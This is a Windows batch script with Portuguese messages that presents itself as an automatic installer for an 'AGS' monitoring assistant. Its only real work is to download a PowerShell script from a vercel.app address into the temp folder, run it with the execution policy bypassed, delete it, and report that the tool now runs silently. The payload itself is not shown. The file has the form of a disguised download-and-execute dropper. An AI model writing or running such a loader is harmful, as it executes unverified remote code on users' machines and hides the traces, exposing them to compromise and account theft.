@echo off
set AGS_VER=v2.4.0
title Assistente do AGS %AGS_VER% - Instalador Automatico
color 0A
cls
echo.
echo  ========================================================
echo    ⚡ ASSISTENTE DO AGS %AGS_VER% - CONFIGURACAO AUTOMATICA
echo  ========================================================
echo.
echo   Versao do Script: %AGS_VER% (Build 2026.08.31)
echo   Configurando o monitoramento do Antigravity nesta maquina...
echo   Por favor, aguarde alguns segundos.
echo.

set SETUP_FILE=%TEMP%\ags_setup.ps1

if exist "%SETUP_FILE%" del /f /q "%SETUP_FILE%" >nul 2>&1
curl -s -L -o "%SETUP_FILE%" https://antigravity-gmail-switcher.vercel.app/setup.ps1

if exist "%SETUP_FILE%" (
    powershell -NoProfile -ExecutionPolicy Bypass -File "%SETUP_FILE%"
    del /f /q "%SETUP_FILE%" >nul 2>&1
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://antigravity-gmail-switcher.vercel.app/setup.ps1', '%SETUP_FILE%')"
    if exist "%SETUP_FILE%" (
        powershell -NoProfile -ExecutionPolicy Bypass -File "%SETUP_FILE%"
        del /f /q "%SETUP_FILE%" >nul 2>&1
    )
)

echo.
echo  ========================================================
echo    ✅ INSTALACAO CONCLUIDA COM SUCESSO!
echo  ========================================================
echo.
echo   O Assistente do AGS ja esta ativo e rodando silenciosamente.
echo   Voce ja pode fechar esta janela e recarregar seu painel.
echo.
timeout /t 5
